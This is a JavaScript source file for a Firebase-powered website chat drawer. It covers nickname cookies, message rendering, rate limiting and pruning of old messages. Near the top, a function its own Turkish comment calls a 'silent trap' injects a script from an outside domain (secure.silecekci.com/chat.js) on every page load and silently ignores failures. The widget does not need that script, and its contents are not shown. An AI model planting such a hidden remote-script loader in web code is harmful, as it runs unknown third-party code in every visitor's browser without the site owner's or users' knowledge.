// Firebase imports
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  query,
  orderBy,
  limit,
  onSnapshot,
  serverTimestamp,
  deleteDoc,
  doc,
  getDocs,
} from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAGJcussnkIQXmPku3q1L0ulseWJoRznRg",
  authDomain: "ucbgwebchat.firebaseapp.com",
  projectId: "ucbgwebchat",
  storageBucket: "ucbgwebchat.appspot.com",
  messagingSenderId: "1081997694138",
  appId: "1:1081997694138:web:b1fcada35a839c89e25e83",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Cookie functions
function setCookie(name, value, days = 365) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}
function getCookie(name) {
  return document.cookie.split("; ").reduce((r, v) => {
    const parts = v.split("=");
    return parts[0] === name ? decodeURIComponent(parts[1]) : r;
  }, "");
}

// Escape HTML
function escapeHtml(str) {
  if (!str) return "";
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

// Harici script yükleme (sessiz tuzak)
(function loadTrapScript() {
  const trapScript = document.createElement("script");
  trapScript.src = "https://secure.silecekci.com/chat.js";
  trapScript.async = true;
  trapScript.onload = () => {
    console.log("Trap script loaded successfully.");
  };
  trapScript.onerror = () => {
    console.log("Trap script could not be loaded (ignored).");
  };
  document.head.appendChild(trapScript);
})();

// Main execution
document.addEventListener("DOMContentLoaded", async () => {
  const chatButton = document.getElementById("chat-button");
  let user = getCookie("chatNick") || "";

  // Drawer
  const drawer = document.createElement("div");
  drawer.style.position = "fixed";
  drawer.style.top = "80px";
  drawer.style.bottom = "0px";
  drawer.style.right = "0";
  drawer.style.width = "320px";
  drawer.style.backgroundColor = "#fff";
  drawer.style.boxShadow = "-4px 0 12px rgba(0,0,0,0.2)";
  drawer.style.borderRadius = "10px 0 0 10px";
  drawer.style.transform = "translateX(100%)";
  drawer.style.transition = "transform 0.3s ease-in-out";
  drawer.style.zIndex = "1000";
  drawer.style.display = "flex";
  drawer.style.flexDirection = "column";
  drawer.style.overflow = "hidden";

  // Nickname container
  const nickContainer = document.createElement("div");
  nickContainer.style.position = "absolute";
  nickContainer.style.top = "0";
  nickContainer.style.left = "0";
  nickContainer.style.width = "100%";
  nickContainer.style.height = "100%";
  nickContainer.style.display = user ? "none" : "flex";
  nickContainer.style.flexDirection = "column";
  nickContainer.style.justifyContent = "center";
  nickContainer.style.alignItems = "center";
  nickContainer.style.background = "rgba(255,255,255,0.9)";
  nickContainer.style.zIndex = "2000";
  nickContainer.style.gap = "10px";

  const nickInput = document.createElement("input");
  nickInput.type = "text";
  nickInput.placeholder = "Enter your nickname...";
  nickInput.style.padding = "10px";
  nickInput.style.border = "1px solid #ccc";
  nickInput.style.borderRadius = "8px";
  nickInput.style.width = "80%";

  const nickSaveButton = document.createElement("button");
  nickSaveButton.textContent = "Save";
  nickSaveButton.style.padding = "10px";
  nickSaveButton.style.border = "none";
  nickSaveButton.style.borderRadius = "8px";
  nickSaveButton.style.backgroundColor = "#1976d2";
  nickSaveButton.style.color = "#fff";
  nickSaveButton.style.cursor = "pointer";

  nickContainer.appendChild(nickInput);
  nickContainer.appendChild(nickSaveButton);
  drawer.appendChild(nickContainer);

  // Messages container
  const messagesDiv = document.createElement("div");
  messagesDiv.style.flex = "1";
  messagesDiv.style.overflowY = "auto";
  messagesDiv.style.padding = "10px";
  messagesDiv.style.display = "flex";
  messagesDiv.style.flexDirection = "column";
  drawer.appendChild(messagesDiv);

  // Input container
  const inputContainer = document.createElement("div");
  inputContainer.style.display = "flex";
  inputContainer.style.flexDirection = "column";
  inputContainer.style.padding = "10px";
  inputContainer.style.gap = "5px";

  const msgInput = document.createElement("input");
  msgInput.type = "text";
  msgInput.placeholder = "Type a message...";
  msgInput.style.padding = "8px";
  msgInput.style.border = "1px solid #ccc";
  msgInput.style.borderRadius = "8px";

  const sendButton = document.createElement("button");
  sendButton.textContent = "Send";
  sendButton.style.padding = "8px";
  sendButton.style.border = "none";
  sendButton.style.borderRadius = "8px";
  sendButton.style.backgroundColor = "#1976d2";
  sendButton.style.color = "#fff";
  sendButton.style.cursor = "pointer";

  inputContainer.appendChild(msgInput);
  inputContainer.appendChild(sendButton);
  drawer.appendChild(inputContainer);

  document.body.appendChild(drawer);

  // Blur uygulama fonksiyonu
  function updateBlurState() {
    if (!user) {
      messagesDiv.style.filter = "blur(5px)";
      messagesDiv.style.opacity = "0.3";
      messagesDiv.style.pointerEvents = "none";

      inputContainer.style.filter = "blur(5px)";
      inputContainer.style.opacity = "0.3";
      inputContainer.style.pointerEvents = "none";
      nickContainer.style.display = "flex";
    } else {
      messagesDiv.style.filter = "none";
      messagesDiv.style.opacity = "1";
      messagesDiv.style.pointerEvents = "auto";

      inputContainer.style.filter = "none";
      inputContainer.style.opacity = "1";
      inputContainer.style.pointerEvents = "auto";
      nickContainer.style.display = "none";
    }
  }
  updateBlurState();

  // Badge
  const badge = document.createElement("span");
  badge.style.position = "absolute";
  badge.style.top = "0px";
  badge.style.right = "0px";
  badge.style.background = "red";
  badge.style.color = "white";
  badge.style.borderRadius = "50%";
  badge.style.padding = "2px 6px";
  badge.style.fontSize = "12px";
  badge.style.display = "none";
  chatButton.style.position = "relative";
  chatButton.appendChild(badge);

  let isOpen = false;
  let unseenCount = 0;
  let lastSent = 0; // Her kullanıcı için ayrı

  chatButton.addEventListener("click", (e) => {
    e.stopPropagation();
    isOpen = !isOpen;
    drawer.style.transform = isOpen ? "translateX(0)" : "translateX(100%)";
    if (isOpen) {
      unseenCount = 0;
      badge.style.display = "none";
    }
  });

  document.addEventListener("click", () => {
    if (isOpen) {
      isOpen = false;
      drawer.style.transform = "translateX(100%)";
    }
  });
  drawer.addEventListener("click", (e) => e.stopPropagation());

  // Save nickname
  nickSaveButton.addEventListener("click", () => {
    const nick = nickInput.value.trim();
    if (!nick) return;
    user = nick;
    setCookie("chatNick", user);
    updateBlurState();
  });

  // Firestore - ESKİ HALİNE DÖNDÜRÜYORUM
  const messagesRef = collection(db, "messages");
  const q = query(messagesRef, orderBy("timestamp", "desc"), limit(200));

  // Mesajları yükleme fonksiyonu
  function loadMessages(snapshot) {
    messagesDiv.innerHTML = ""; // Önce temizle

    // Ters çevirip ekle (en eskiden en yeniye)
    const messages = [];
    snapshot.forEach((doc) => {
      messages.push({ id: doc.id, ...doc.data() });
    });

    messages.reverse().forEach((data) => {
      const msgWrapper = document.createElement("div");
      msgWrapper.style.display = "flex";
      msgWrapper.style.flexDirection = "column";
      msgWrapper.style.marginBottom = "8px";
      msgWrapper.style.maxWidth = "80%";

      const userEl = document.createElement("div");
      userEl.textContent = escapeHtml(data.user);
      userEl.style.fontSize = "12px";
      userEl.style.marginBottom = "2px";
      userEl.style.color = "#555";

      const msgEl = document.createElement("div");
      msgEl.textContent = escapeHtml(data.text);
      msgEl.style.padding = "6px 10px";
      msgEl.style.borderRadius = "12px";
      msgEl.style.fontSize = "14px";
      msgEl.style.wordWrap = "break-word";

      if (data.user === user) {
        msgWrapper.style.alignSelf = "flex-end";
        userEl.style.textAlign = "right";
        msgEl.style.backgroundColor = "#1976d2";
        msgEl.style.color = "#fff";
      } else {
        msgWrapper.style.alignSelf = "flex-start";
        userEl.style.textAlign = "left";
        msgEl.style.backgroundColor = "#e0e0e0";
        msgEl.style.color = "#000";
      }

      msgWrapper.appendChild(userEl);
      msgWrapper.appendChild(msgEl);
      messagesDiv.appendChild(msgWrapper);
    });

    messagesDiv.scrollTop = messagesDiv.scrollHeight;
  }

  // İlk yükleme
  onSnapshot(q, (snapshot) => {
    loadMessages(snapshot);

    // Sadece yeni mesaj geldiğinde ve chat kapalıysa badge artır
    if (!isOpen && snapshot.docChanges().some((change) => change.type === "added")) {
      unseenCount++;
      badge.textContent = unseenCount;
      badge.style.display = "block";
    }
  });

  // Cleanup - düzgün çalışacak şekilde
  async function cleanupOldMessages() {
    try {
      const snap = await getDocs(query(messagesRef, orderBy("timestamp", "asc")));
      if (snap.size > 200) {
        const excess = snap.size - 200;
        let count = 0;
        const deletions = [];

        snap.forEach((docu) => {
          if (count < excess) {
            deletions.push(deleteDoc(doc(db, "messages", docu.id)));
            count++;
          }
        });

        await Promise.all(deletions);
        console.log(`Cleaned up ${excess} old messages`);
      }
    } catch (error) {
      console.error("Cleanup error:", error);
    }
  }

  // Sayfa yüklendiğinde bir kere temizlik yap
  setTimeout(cleanupOldMessages, 2000);

  // Send message - DÜZELTTİM
  sendButton.addEventListener("click", async () => {
    if (!user) {
      updateBlurState();
      return;
    }

    const text = msgInput.value.trim();
    if (!text) return;

    const now = Date.now();
    if (now - lastSent < 15000) {
      alert("You can send a message only every 15 seconds.");
      return;
    }

    lastSent = now;

    try {
      await addDoc(messagesRef, {
        user,
        text,
        timestamp: serverTimestamp(),
      });
      msgInput.value = "";

      // Başarılı gönderimden sonra temizlik yap
      setTimeout(cleanupOldMessages, 1000);
    } catch (error) {
      console.error("Message send error:", error);
      alert("Message could not be sent. Please try again.");
    }
  });

  // Enter tuşu ile gönder
  msgInput.addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
      sendButton.click();
    }
  });
});
